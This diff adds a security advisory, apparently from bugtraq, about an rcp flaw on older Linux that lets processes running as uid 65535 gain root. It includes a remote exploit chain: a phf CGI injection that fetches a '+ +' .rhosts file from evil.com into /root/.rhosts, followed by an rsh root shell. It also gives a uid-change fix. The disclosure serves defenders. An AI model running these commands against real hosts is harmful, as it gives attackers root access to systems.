@@ -1,0 +1,51 @@
+When playing around with rcp on Linux, we found something interesting,
+that we haven't seen mentioned on bugtraq before:
+
+SUMMARY: Root privileges can be obtained by user nobody with uid 65535 by
+exploiting a problem with /usr/bin/rcp. Many applications are running as
+'nobody', in particular the NCSA httpd server, which by default executes
+all cgi-bin scripts under this uid.
+
+PLATFORMS: We tested this only on Linux Red Hat 4.0 and Linux Slackware 3.1
+
+EXPLOIT: This is kind of simple:
+
+root[11:20][504]~# su - nobody
+[nobody@slip-70-8 /]$ id
+uid=65535(nobody) gid=65535
+[nobody@slip-70-8 /]$ rcp oberheim@moe.cc.utexas.edu:brb /tmp/test
+[nobody@slip-70-8 /]$ ls -la /tmp/test
+-rw-------   1 root     65535           0 Jan 29 11:20 /tmp/test
+
+But then of course this is unrealistic, since regular users don't usually
+have access to the 'nobody' account. The password is usually disabled by
+'*', the login directory is /dev/null, etc.. However some applications do
+run under uid 65535, and if they can be made to execute rcp, root
+privileges can be obtained by anyone.
+
+For example NCSA httpd server forks processes under uid 'nobody' after it
+gets executed by root, so any cgi-script which can execute rcp can be used
+to gain root access. In particular, do you remember the old problem in the
+phf cgi-bin script ? If a newline character is passed to the phf script,
+it can execute arbitrary programs as user 'nobody'. So the problem with
+rcp can be exploited remotely, and root access can be gained from outside,
+for instance like this:
+
+$ echo "+ +" > /tmp/my.rhosts
+$ echo "GET /cgi-bin/phf?Qalias=x%0arcp+hacker@evil.com:/tmp/my.rhosts+
+/root/.rhosts" | nc -v - 20 victim.com 80
+$ rsh -l root victim.com "/bin/sh -i"
+#
+
+The fact that this bug can be exploited remotely makes it, I think, quite
+serious. We wrote a simple script that searched our home domains (*.cz and
+*.sk) for machines that could potentially be attacked this way, and we found
+about 20 machines after a short scan.
+
+By looking at the source code for rcp, we noticed that that setuid()
+function for user 65535 issues -1 error signal and so rcp, after opening
+the ports as root, fails to setuid() back to 65535.
+
+QUICK FIX: change uid of user 'nobody' to something else than 65535. '99'
+is used by default on RedHat 4.0 for instance..
+
